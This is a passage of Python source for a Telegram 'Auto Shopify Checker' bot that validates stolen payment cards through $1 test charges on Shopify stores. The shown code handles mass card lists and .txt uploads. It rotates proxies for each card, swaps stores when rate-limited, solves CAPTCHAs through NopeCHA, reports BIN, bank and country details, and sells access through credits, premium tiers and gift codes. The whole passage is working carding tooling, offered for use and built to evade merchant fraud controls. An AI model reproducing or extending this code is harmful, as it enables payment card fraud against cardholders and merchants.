        site_used = result.get('site_used', current_site['domain'])
        
        response_text = f"""#Shopify_Charge | T R U S T [/sh]
━━━━━━━━━━━━━
[ϟ] Card: {result['full_card']}
[ϟ] Gateway: Shopify 1$
[ϟ] Site: {site_used}
[ϟ] Status: {status_emoji}
[ϟ] Response: {response_format}
━━━━━━━━━━━━━
[ϟ] Bin: {result['bin']}
[ϟ] Info: {bin_info['scheme']} - {bin_info['type']} - PERSONAL
[ϟ] Bank: {bin_info['bank']}
[ϟ] Country: {bin_info['country']} - [{bin_info['emoji']}]
━━━━━━━━━━━━━
[ϟ] Checked By: @{result['username']} [ 💎 PREMIUM ]
[⌥] Dev: {result['dev']} - {result['dev_emoji']}
━━━━━━━━━━━━━
[ϟ] Time: [{result['elapsed_time']}] | Credits: [{remaining_credits}] | Status: [Live 🌥]"""
    
    try:
        bot.edit_message_text(response_text, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id)
    except Exception as e:
        print(f"Could not edit message: {e}")
        bot.reply_to(message, response_text)


# ════════════════════════════════════════════════════════════════════════════════════════
# MASS CARD CHECK FUNCTION WITH AUTO SITE ROTATION
# ════════════════════════════════════════════════════════════════════════════════════════

def process_card_list(message, cards, username):
    """
    Process a list of cards with automatic site rotation on rate limits.
    """
    user_id = message.from_user.id
    
    if not cards:
        bot.reply_to(message, "No valid cards found to check.")
        return
    
    # Check if sites are available
    current_site = get_current_site()
    if not current_site:
        bot.reply_to(message, """❌ **No Sites Available!**

Please add a Shopify site first using:
`/addsite link product-id`""", parse_mode='Markdown')
        return
    
    total_cards = len(cards)
    if total_cards > 1000:
        bot.reply_to(message, f"Too many cards. Please provide a maximum of 1000 cards. You provided {total_cards}.")
        return
    
    # Check if user has enough credits
    credits = get_user_credits(user_id)
    if credits < total_cards:
        bot.reply_to(message, f"❌ Insufficient credits! You have {credits} credits but need {total_cards} credits to check all cards.")
        return
    
    # Start timing
    bulk_start_time = time.time()
    
    # Proxy Info
    proxy_info = "ℹ️ Proxies: None"
    if proxy_list:
        proxy_info = f"🔒 Proxies: Rotating {len(proxy_list)}"
        try:
            is_working, proxy_ms = test_proxy(proxy_list[0])
            host = proxy_list[0]['http'].split('@')[-1]
            if is_working:
                proxy_info = f"🔒 Using {len(proxy_list)} proxies (e.g., `{host}` @ {proxy_ms}ms)"
            else:
                proxy_info = f"⚠️ Using {len(proxy_list)} proxies (e.g., `{host}` not responding)"
        except Exception:
             proxy_info = f"⚠️ Error testing {len(proxy_list)} proxies"
    
    # Site info
    sites_count = len(get_all_sites())
    site_info = f"🏪 Sites: {sites_count} available (Current: `{current_site['domain']}`)"
    
    start_msg = f"Starting check... Found {total_cards} cards to process. ⚪️"
    start_msg += f"\nWill process in batches of 10."
    start_msg += f"\n{proxy_info}"
    start_msg += f"\n{site_info}"
    
    sent_msg = bot.reply_to(message, start_msg, parse_mode='Markdown')
    
    # Thread-safe structures for tracking results
    stats_lock = threading.Lock()
    stats_counters = {'successful': 0, 'declined': 0, 'errors': 0}
    
    # Site rotation tracking
    site_rotation_info = {'rotated': False, 'removed_sites': []}
    
    # Define batch size
    BATCH_SIZE = 5
    
    # Process cards in batches
    num_batches = math.ceil(total_cards / BATCH_SIZE)
    
    # This index will rotate proxies *per card*
    proxy_card_index = 0
    
    for i, batch in enumerate(create_batches(cards, BATCH_SIZE)):
        batch_start_time = time.time()
        
        # Check if we still have sites
        current_site = get_current_site()
        if not current_site:
            bot.send_message(message.chat.id, "❌ **All sites have been rate limited!** No more sites available. Please add new sites with `/addsite`", parse_mode='Markdown')
            break
        
        try:
            bot.edit_message_text(f"Processing batch {i+1}/{num_batches} ({len(batch)} cards)... 🌀\n"
                                f"Total Checked: {i * BATCH_SIZE}/{total_cards}\n"
                                f"🏪 Current Site: `{current_site['domain']}`",
                                chat_id=sent_msg.chat.id, message_id=sent_msg.message_id, parse_mode='Markdown')
        except Exception:
            pass
        
        threads = []
        batch_results = []
        
        # Check credits for the whole batch
        current_credits = get_user_credits(user_id)
        cards_in_batch_to_process = min(len(batch), current_credits)
        
        if cards_in_batch_to_process < len(batch):
             bot.send_message(message.chat.id, f"⚠️ Ran out of credits! Processing {cards_in_batch_to_process} cards instead of {len(batch)}.")
        
        if cards_in_batch_to_process <= 0:
            bot.send_message(message.chat.id, f"⚠️ Ran out of credits! Stopping check.")
            break
        
        # Only process the number of cards they have credits for
        for j in range(cards_in_batch_to_process):
            card_details = batch[j]
            
            # Deduct credit before starting thread
            deduct_credit(user_id) 
            
            # Proxy rotation logic
            current_proxy = None
            if proxy_list:
                current_proxy = proxy_list[proxy_card_index % len(proxy_list)]
                proxy_card_index += 1
            
            # Create and start the thread
            t = threading.Thread(target=check_card_worker_safe, 
                                 args=(card_details, username, current_proxy, batch_results, stats_counters, stats_lock, site_rotation_info))
            threads.append(t)
            t.start()
        
        # Wait for all threads in this batch to complete
        for t in threads:
            t.join()
        
        batch_time = time.time() - batch_start_time
        
        # Check if site was rotated during this batch
        if site_rotation_info['rotated']:
            removed = ", ".join(site_rotation_info['removed_sites'])
            new_site = get_current_site()
            if new_site:
                bot.send_message(message.chat.id, f"⚠️ **Site Rotation!**\nRemoved: `{removed}`\nNew site: `{new_site['domain']}`", parse_mode='Markdown')
            else:
                bot.send_message(message.chat.id, f"⚠️ **Site Removed!**\n`{removed}` was rate limited.\n❌ No more sites available!", parse_mode='Markdown')
            site_rotation_info['rotated'] = False
            site_rotation_info['removed_sites'] = []
        
        # Send the results for this batch
        if batch_results:
            try:
                bot.send_message(message.chat.id, "\n\n".join(batch_results), parse_mode='Markdown')
            except Exception as e:
                print(f"Error sending batch results: {e}")
        
        # If we stopped early due to credits, break the outer loop
        if cards_in_batch_to_process < len(batch):
            break
            
        # Small delay before next batch
        if (i+1) < num_batches:
            try:
                bot.edit_message_text(f"Batch {i+1}/{num_batches} complete ({batch_time:.2f}s). ✅\n"
                                    f"Waiting 1s before next batch...",
                                    chat_id=sent_msg.chat.id, message_id=sent_msg.message_id)
            except Exception:
                pass
            time.sleep(1)
        
    # All batches done
    
    # Calculate total time
    total_time = time.time() - bulk_start_time
    total_cards_processed = sum(stats_counters.values())
    avg_time = total_time / total_cards_processed if total_cards_processed > 0 else 0
    
    remaining_credits = get_user_credits(user_id)
    remaining_sites = len(get_all_sites())
    
    # Build completion message
    completion_msg = f"""✅ **Check Completed!**
━━━━━━━━━━━━━
📊 **Statistics:**
• Total Cards: {total_cards_processed}
• Charged: {stats_counters['successful']} 🔥
• Declined: {stats_counters['declined']} ❌
• Errors: {stats_counters['errors']} ⚠️

⏱️ **Timing:**
• Total Time: {total_time:.2f}s
• Avg per Card: {avg_time:.2f}s
• Speed: {total_cards_processed/total_time*60:.1f} cards/min

💳 **Credits:**
• Remaining: {remaining_credits}

🏪 **Sites:**
• Remaining: {remaining_sites}
"""
    
    if proxy_info:
        completion_msg += f"\n{proxy_info}"
    
    completion_msg += "\n━━━━━━━━━━━━━\n👑 Dev: T R U S T E D"
    
    # Edit the "Processing..." message to the final summary
    try:
        bot.edit_message_text(completion_msg, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id, parse_mode='Markdown')
    except Exception as e:
        print(f"Error editing final message: {e}")
        bot.send_message(message.chat.id, completion_msg, parse_mode='Markdown')


# ════════════════════════════════════════════════════════════════════════════════════════
# MASS CHECK COMMAND - /msh
# ════════════════════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['msh'])
def mass_check_cards(message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or "USER"
        add_user(user_id, username)
        
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            bot.reply_to(message, "Invalid format. Use /msh followed by a list of cards.")
            return
            
        card_list_raw = args[1]
        cards = [card.strip() for card in re.split(r'[\n\s]+', card_list_raw) if card.strip()]
        
        # Check if user is premium
        is_premium = is_user_premium(user_id)
        
        # Enforce 50-card limit for free users
        if not is_premium and len(cards) > 50:
            bot.reply_to(message, f"Invalid: Free users can check max 50 cards. You provided {len(cards)} cards.")
            return
        
        # Call the threaded function
        process_card_list(message, cards, username)
    except Exception as e:
        print(f"An unexpected error occurred in /mass command: {e}")
        bot.reply_to(message, "An unexpected error occurred. Please check the logs.")


# ════════════════════════════════════════════════════════════════════════════════════════
# FILE UPLOAD HANDLER
# ════════════════════════════════════════════════════════════════════════════════════════

@bot.message_handler(content_types=['document'])
def handle_document_upload(message):
    try:
        doc = message.document
        if not doc.file_name.lower().endswith('.txt'):
            bot.reply_to(message, "Invalid file type. Please upload a `.txt` file. ❌")
            return
        file_info = bot.get_file(doc.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        file_content = downloaded_file.decode('utf-8', errors='ignore')
        cards = [line.strip() for line in file_content.splitlines() if line.strip()]
        username = message.from_user.username or "USER"
        # Call the threaded function
        process_card_list(message, cards, username)
    except Exception as e:
        print(f"Error handling document: {e}")
        bot.reply_to(message, "An error occurred while processing the file.")


# ════════════════════════════════════════════════════════════════════════════════════════
# PROXY MANAGEMENT COMMANDS
# ════════════════════════════════════════════════════════════════════════════════════════

def test_proxy(proxy_dict):
    """Test proxy by making a request and return response time in ms"""
    try:
        # Test against a site if available, otherwise use a default
        current_site = get_current_site()
        if current_site:
            test_url = current_site['url']
        else:
            test_url = "https://www.shopify.com"
        
        start_time = time.time()
        response = requests.get(test_url, proxies=proxy_dict, timeout=10)
        elapsed_ms = int((time.time() - start_time) * 1000)
        
        if response.status_code == 200:
            return True, elapsed_ms
        else:
            return False, 0
    except Exception as e:
        return False, 0


@bot.message_handler(commands=['addproxy'])
def add_proxy(message):
    global proxy_list
    try:
        proxy_string = message.text.split(maxsplit=1)[1]
        
        parts = proxy_string.split(':')
        if len(parts) != 4:
            bot.reply_to(message, "Invalid proxy format. ❌\nPlease use: `/addproxy ip:port:user:pass`", parse_mode='Markdown')
            return
        ip, port, user, password = parts
        proxy_url = f"http://{user}:{password}@{ip}:{port}"
        
        new_proxy = {
            "http": proxy_url,
            "https": proxy_url
        }
        
        # Send testing message
        testing_msg = bot.reply_to(message, f"🔍 Testing proxy: `{ip}:{port}`\nPlease wait...", parse_mode='Markdown')
        
        # Test the proxy
        is_working, response_time = test_proxy(new_proxy)
        
        if is_working:
            proxy_list.append(new_proxy)
            bot.edit_message_text(
                f"✅ Proxy added successfully!\n\n"
                f"📍 Proxy: `{ip}:{port}`\n"
                f"⚡ Response Time: `{response_time}ms`\n"
                f"📊 Total Proxies: `{len(proxy_list)}`",
                chat_id=testing_msg.chat.id,
                message_id=testing_msg.message_id,
                parse_mode='Markdown'
            )
        else:
            bot.edit_message_text(
                f"❌ Proxy test failed!\n\n"
                f"📍 Proxy: `{ip}:{port}`\n"
                f"⚠️ Status: Not working or timeout\n"
                f"💡 Please check your proxy credentials and try again.",
                chat_id=testing_msg.chat.id,
                message_id=testing_msg.message_id,
                parse_mode='Markdown'
            )
    except IndexError:
        bot.reply_to(message, "Please provide a proxy. ❌\nUsage: `/addproxy ip:port:user:pass`", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"An error occurred while adding the proxy: {e}")


@bot.message_handler(commands=['removeproxies'])
def remove_proxies(message):
    global proxy_list
    proxy_list.clear()
    bot.reply_to(message, "All proxies have been successfully removed. ✅")


@bot.message_handler(commands=['myproxies'])
def my_proxies(message):
    if proxy_list:
        testing_msg = bot.reply_to(message, "🔍 Testing all proxies...\nPlease wait...")
        
        proxy_status = []
        for idx, proxy in enumerate(proxy_list, 1):
            host = proxy['http'].split('@')[-1]
            is_working, response_time = test_proxy(proxy)
            
            if is_working:
                status = f"{idx}. `{host}` - ✅ {response_time}ms"
            else:
                status = f"{idx}. `{host}` - ❌ Not responding"
            
            proxy_status.append(status)
        
        proxy_text = "📋 **Your Proxies:**\n━━━━━━━━━━━━━\n" + "\n".join(proxy_status)
        proxy_text += f"\n━━━━━━━━━━━━━\n📊 Total: {len(proxy_list)} proxies"
        
        bot.edit_message_text(proxy_text, chat_id=testing_msg.chat.id, message_id=testing_msg.message_id, parse_mode='Markdown')
    else:
        bot.reply_to(message, "No proxies added yet. ❌\n\nUse `/addproxy ip:port:user:pass` to add a proxy.", parse_mode='Markdown')


# ════════════════════════════════════════════════════════════════════════════════════════
# ADMIN COMMANDS
# ════════════════════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['gencode'])
def generate_code(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_CHAT_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    
    try:
        credits = int(message.text.split()[1])
        code = generate_gift_code(credits, user_id)
        bot.reply_to(message, f"""🎁 **Gift Code Generated!**
━━━━━━━━━━━━━
💰 Credits: {credits}
🔑 Code: `{code}`
━━━━━━━━━━━━━
Share this code with users to redeem.""", parse_mode='Markdown')
    except (IndexError, ValueError):
        bot.reply_to(message, "Invalid format. Use: /gencode <credits>")


@bot.message_handler(commands=['addcredits'])
def add_credits_cmd(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_CHAT_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    
    try:
        args = message.text.split()
        target_user_id = int(args[1])
        amount = int(args[2])
        
        add_credits(target_user_id, amount)
        new_balance = get_user_credits(target_user_id)
        
        bot.reply_to(message, f"""✅ **Credits Added!**
━━━━━━━━━━━━━
👤 User: {target_user_id}
💰 Added: {amount} credits
📊 New Balance: {new_balance} credits""", parse_mode='Markdown')
    except (IndexError, ValueError):
        bot.reply_to(message, "Invalid format. Use: /addcredits <user_id> <amount>")


@bot.message_handler(commands=['stats'])
def view_stats(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_CHAT_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    
    try:
        data = load_data()
        
        total_users = len(data['users'])
        total_checks = sum(user.get('total_checks', 0) for user in data['users'].values())
        unused_codes = sum(1 for code in data['gift_codes'].values() if not code['is_used'])
        used_codes = sum(1 for code in data['gift_codes'].values() if code['is_used'])
        
        # Site stats
        sites = get_all_sites()
        sites_count = len(sites)
        
        stats_text = f"""📊 **Bot Statistics**
━━━━━━━━━━━━━
👥 Total Users: {total_users}
✅ Total Checks: {total_checks}
🎁 Active Gift Codes: {unused_codes}
🎫 Redeemed Codes: {used_codes}
🏪 Active Sites: {sites_count}
━━━━━━━━━━━━━
👑 Admin: T R U S T E D
"""
        bot.reply_to(message, stats_text, parse_mode='Markdown')
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error fetching stats: {e}")


@bot.message_handler(commands=['makepremium'])
def make_premium_cmd(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_CHAT_ID:
        bot.reply_to(message, "You are not authorized to use this command.")
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "Invalid format. Use: /makepremium <user_id>")
            return
        
        target_user_id = int(args[1])
        success, msg = make_user_premium(target_user_id)
        
        if success:
            bot.reply_to(message, f"✅ Success: {msg}\n\nUser {target_user_id} is now premium with unlimited credits!")
        else:
            bot.reply_to(message, f"❌ Error: {msg}")
    except ValueError:
        bot.reply_to(message, "Invalid user ID. Please provide a valid number.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")


@bot.message_handler(commands=['removepremium'])
def remove_premium_cmd(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_CHAT_ID:
        bot.reply_to(message, "You are not authorized to use this command.")
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "Invalid format. Use: /removepremium <user_id>")
            return
        
        target_user_id = int(args[1])
        success, msg = remove_user_premium(target_user_id)
        
        if success:
            bot.reply_to(message, f"✅ Success: {msg}\n\nUser {target_user_id} is no longer premium.")
        else:
            bot.reply_to(message, f"❌ Error: {msg}")
    except ValueError:
        bot.reply_to(message, "Invalid user ID. Please provide a valid number.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")


@bot.message_handler(commands=['premiumusers'])
def view_premium_users(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_CHAT_ID:
        bot.reply_to(message, "You are not authorized to use this command.")
        return
    
    try:
        data = load_data()
        premium_users = data.get('premium_users', {})
        
        if not premium_users:
            bot.reply_to(message, "No premium users found.")
            return
        
        premium_list = []
        for user_id_str, info in premium_users.items():
            promoted_date = info.get('promoted_date', 'Unknown')
            premium_list.append(f"👤 User ID: `{user_id_str}` - Promoted: {promoted_date}")
        
        premium_text = "👑 **Premium Users:**\n━━━━━━━━━━━━━\n" + "\n".join(premium_list)
        bot.reply_to(message, premium_text, parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_CHAT_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    
    try:
        broadcast_text = message.text.split(maxsplit=1)[1]
        data = load_data()
        
        sent_count = 0
        failed_count = 0
        
        for user_id_str in data['users'].keys():
            try:
                bot.send_message(int(user_id_str), f"📢 **Broadcast Message:**\n\n{broadcast_text}", parse_mode='Markdown')
                sent_count += 1
            except:
                failed_count += 1
        
        bot.reply_to(message, f"✅ Broadcast sent!\n\n📤 Sent: {sent_count}\n❌ Failed: {failed_count}")
    except IndexError:
        bot.reply_to(message, "Please provide a message to broadcast.\nUsage: /broadcast <message>")


# ════════════════════════════════════════════════════════════════════════════════════════
# MAIN BOT RUNNER
# ════════════════════════════════════════════════════════════════════════════════════════

if __name__ == '__main__':
    print("=" * 60)
    print("  AUTO SHOPIFY CHECKER BOT - WITH NOPECHA CAPTCHA SOLVING")
    print("=" * 60)
    print(f"CAPTCHA Solving: {'ENABLED' if ENABLE_CAPTCHA_SOLVING and NOPECHA_API_KEY != 'YOUR_NOPECHA_API_KEY_HERE' else 'DISABLED - Set API key to enable'}")
    print("Starting bot...")
    
    # Suppress telebot logging
    logging.getLogger('telebot').setLevel(logging.CRITICAL)
    
    max_retries = 3
    retry_count = 0
    
    while retry_count < max_retries:
        try:
            print(f"Bot is now online and ready! 🔥")
            print(f"Features:")
            print(f"  - Multi-site support with /addsite")
            print(f"  - Auto site rotation on rate limits")
            print(f"  - Proxy support")
            print(f"  - Credit system")
            print(f"  - NopeCHA CAPTCHA solving")
            print("=" * 60)
            bot.infinity_polling(timeout=10, long_polling_timeout=5, skip_pending=True)
            break
        except KeyboardInterrupt:
            print("Bot stopped by user ✋")
            break
        except Exception as e:
            error_msg = str(e)
            if "409" in error_msg:
                retry_count += 1
                if retry_count < max_retries:
                    print(f"Conflict detected. Retrying... ({retry_count}/{max_retries}) ⏳")
                    time.sleep(3)
                else:
                    print("Multiple bot instances detected. Please manually stop other bots first. ❌")
                    break
            elif "Network" in error_msg or "Connection" in error_msg:
                print("Network issue detected. Retrying in 5 seconds... 🌐")
                time.sleep(5)
                continue
            else:
                print(f"Bot error: {error_msg[:80]}... ❌")
                break
    
    print("Bot session ended.")